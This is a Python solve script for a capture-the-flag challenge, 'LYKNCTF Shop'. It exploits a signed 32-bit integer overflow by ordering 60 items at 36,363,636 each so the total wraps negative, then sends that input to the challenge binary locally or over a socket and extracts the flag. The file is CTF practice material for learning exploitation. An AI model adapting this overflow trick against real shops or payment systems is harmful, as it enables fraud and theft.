#!/usr/bin/env python3
import argparse
import ctypes
import os
import re
import socket
import stat
import subprocess
import sys
from pathlib import Path

PRICE = 36_363_636
QUANTITY = 60
PAYLOAD = f"b\n3\n{QUANTITY}\nq\n".encode()
FLAG_RE = re.compile(rb"LYKNCTF\{[^}\r\n]+\}")


def wrapped_total(price: int, quantity: int) -> int:
    return ctypes.c_int32(price * quantity).value


def exploit_local(binary: Path) -> bytes:
    if not binary.is_file():
        raise FileNotFoundError(f"binary not found: {binary}")

    binary.chmod(binary.stat().st_mode | stat.S_IXUSR)
    result = subprocess.run(
        [str(binary.resolve())],
        input=PAYLOAD,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=binary.resolve().parent,
        timeout=10,
        check=False,
    )
    return result.stdout


def exploit_remote(host: str, port: int) -> bytes:
    chunks: list[bytes] = []
    with socket.create_connection((host, port), timeout=8) as sock:
        sock.settimeout(3)
        sock.sendall(PAYLOAD)
        try:
            sock.shutdown(socket.SHUT_WR)
        except OSError:
            pass

        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
            if FLAG_RE.search(b"".join(chunks)):
                break

    return b"".join(chunks)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Exploit signed 32-bit integer overflow in LYKNCTF Shop"
    )
    parser.add_argument("host", nargs="?", help="remote host")
    parser.add_argument("port", nargs="?", type=int, help="remote port")
    parser.add_argument(
        "--binary",
        type=Path,
        default=Path(__file__).with_name("shop"),
        help="local ELF path (default: ./shop beside solve.py)",
    )
    args = parser.parse_args()

    if (args.host is None) != (args.port is None):
        parser.error("host and port must be supplied together")

    total = wrapped_total(PRICE, QUANTITY)
    if total >= 0:
        raise RuntimeError("chosen quantity does not produce a negative int32 total")

    print(f"[+] price         : {PRICE}")
    print(f"[+] quantity      : {QUANTITY}")
    print(f"[+] wrapped total : {total}")

    try:
        if args.host is None:
            data = exploit_local(args.binary)
        else:
            data = exploit_remote(args.host, args.port)
    except (OSError, subprocess.SubprocessError) as exc:
        print(f"[-] exploit failed: {exc}", file=sys.stderr)
        return 1

    text = data.decode(errors="replace")
    print(text, end="" if text.endswith("\n") else "\n")

    match = FLAG_RE.search(data)
    if not match:
        print("[-] flag not found in target output", file=sys.stderr)
        return 1

    print(f"[+] flag: {match.group().decode()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
